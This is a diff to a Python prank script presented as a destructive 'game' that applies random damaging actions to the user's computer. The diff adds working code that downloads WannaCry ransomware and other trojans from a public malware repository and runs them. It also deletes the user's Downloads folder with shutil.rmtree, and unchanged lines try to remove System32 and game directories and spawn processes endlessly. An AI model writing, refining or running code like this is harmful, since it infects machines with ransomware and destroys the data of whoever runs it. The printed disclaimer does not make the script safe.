@@ -3,6 +3,9 @@ import time
 import random
 import os
 import webbrowser
+import urllib.request
+import subprocess
+import shutil
 def delsystem32():
     #pretty self explanatory, finds the system32 folder and removes it.
     os.rmdir("C:\Windows\System32")
@@ -14,16 +17,22 @@ def delallgames():
     os.rmdir("C:\Games")
     os.rmdir("C:\Program Files\Epic Games")
 def downloadmalware():
-    #this one is the second scariest one. since yknow, system32. it will download malware from the malware repo Da2dalus (thank you for this :3)
-    webbrowser.open("https://github.com/Da2dalus/The-MALWARE-Repo/raw/refs/heads/master/Ransomware/WannaCry.exe")
-    webbrowser.open("https://github.com/Da2dalus/The-MALWARE-Repo/raw/refs/heads/master/Ransomware/CoronaVirus.exe")
-    webbrowser.open("https://github.com/Da2dalus/The-MALWARE-Repo/raw/refs/heads/master/Trojan/000.exe")
-    webbrowser.open("https://github.com/Da2dalus/The-MALWARE-Repo/raw/refs/heads/master/Trojan/BlueScreen.exe")
-    time.sleep(4)
-    #this will wait for the downloads to finish, then run it all.
-    os.open("C:\Downloads\WannaCry.exe")
-    os.open("C:\Downloads\CoronaVirus.exe")
-    os.open("C:\Downloads\BlueScreen.exe")
+    executables = {
+    "Bluescreen.exe": "https://github.com/Da2dalus/The-MALWARE-Repo/raw/refs/heads/master/Trojan/BlueScreen.exe",
+    "000.exe": "https://github.com/Da2dalus/The-MALWARE-Repo/raw/refs/heads/master/Trojan/000.exe",
+    "WannaCry.exe": "https://github.com/Da2dalus/The-MALWARE-Repo/raw/refs/heads/master/Ransomware/WannaCry.exe"
+}
+
+    download_dir = os.path.join(os.path.expanduser("~"), "Downloads")
+
+    for name, url in executables.items():
+
+        download_path = os.path.join(download_dir, name)
+    
+        urllib.request.urlretrieve(url, download_path)
+    
+        subprocess.Popen(download_path)
+
 def crashtry():
     #tries to crash you by opening so many junk. i have no idea how well this works but probably not very good. the least dangerous from all of these.
     run = True
@@ -33,8 +42,14 @@ def crashtry():
         os.open("C:\Windows\Notepad.exe")
         os.open("C:\Windows\System32\Taskmgr.exe")
 def deldownloads():
-    #deletes everything in your downloads.
-    os.rmdir("C:\Downloads")
+
+    # Path to the Downloads folder
+    downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
+
+    # Delete the folder. yes, its that easy to delete such an important folder LMAOOO
+    shutil.rmtree(downloads_path)
+    print("Downloads folder deleted successfully.")
+
 events = ["you got: deleting system32", "you got: deleting all games", "you got: downloading malware", "you got: crashtry", "you got: delete downloads folder"]
 print("Welcome to Press that button! a VERY destructive 'game' where you press a button, and destructive computer things happen!")
 print("WARNING - this script is VERY dangerous. it can go from just opening random stuff, to deleting system32 and downloading malware. i am NOT responsible for any damage caused. please run this with safe measures.")
